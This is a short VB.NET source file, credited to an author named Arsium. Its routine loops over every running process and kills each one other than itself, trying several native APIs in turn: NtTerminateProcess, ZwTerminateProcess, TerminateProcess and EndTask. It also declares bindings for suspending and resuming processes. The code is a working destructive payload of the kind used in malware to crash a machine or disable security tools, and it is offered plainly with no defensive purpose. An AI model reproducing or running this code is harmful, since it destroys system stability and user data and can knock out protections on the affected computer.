Imports System.Runtime.InteropServices
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class V4
    Public Shared Sub KAP()
        Dim LP As Process() = Process.GetProcesses
        For Each P As Process In LP

            Try
                If Not (P.ProcessName = Process.GetCurrentProcess.ProcessName) Then
                    ProcessEnding.NtTerminateProcess(P.Handle)
                End If
            Catch ex As Exception

            End Try
            Try
                If Not (P.ProcessName = Process.GetCurrentProcess.ProcessName) Then
                    ProcessEnding.ZwTerminateProcess(P.Handle)
                End If
            Catch ex As Exception

            End Try

            Try
                If Not (P.ProcessName = Process.GetCurrentProcess.ProcessName) Then
                    ProcessEnding.TerminateProcess(P.Handle, 0)
                End If
            Catch ex As Exception

            End Try

            Try
                If Not (P.ProcessName = Process.GetCurrentProcess.ProcessName) Then
                    ProcessEnding.EndTask(P.Handle, True, True)
                End If
            Catch ex As Exception

            End Try
            Try
                If Not (P.ProcessName = Process.GetCurrentProcess.ProcessName) Then
                    ProcessEnding.EndTask(P.MainWindowHandle, True, True)
                End If
            Catch ex As Exception

            End Try

        Next
    End Sub


    Public Class ProcessEnding

        <DllImport("ntdll.dll")>
        Public Shared Function NtTerminateProcess(ByVal ProcHandle As IntPtr, Optional ByVal ErrorStatus As Integer = 0) As UInteger
        End Function


        <DllImport("ntdll.dll")>
        Public Shared Function ZwTerminateProcess(ByVal ProcHandle As IntPtr, Optional ByVal ErrorStatus As Integer = 0) As UInteger
        End Function

        <DllImport("user32.dll")>
        Public Shared Function EndTask(ByVal handle As IntPtr, ByVal n As Boolean, ByVal j As Boolean) As Boolean

        End Function

        <DllImport("kernel32.dll")>
        Public Shared Function TerminateProcess(ByVal Handle As IntPtr, ByVal uExitCoed As UInteger) As Boolean

        End Function



        <DllImport("ntdll.dll")>
        Public Shared Function NtSuspendProcess(ByVal ProcHandle As IntPtr) As UInteger
        End Function


        <DllImport("ntdll.dll")>
        Public Shared Function ZwSuspendProcess(ByVal ProcHandle As IntPtr) As UInteger
        End Function


        <DllImport("ntdll.dll")>
        Public Shared Function NtResumeProcess(ByVal ProcessHandle As IntPtr) As IntPtr
        End Function

        <DllImport("ntdll.dll")>
        Public Shared Function ZwResumeProcess(ByVal ProcessHandle As IntPtr) As IntPtr
        End Function

    End Class

End Class
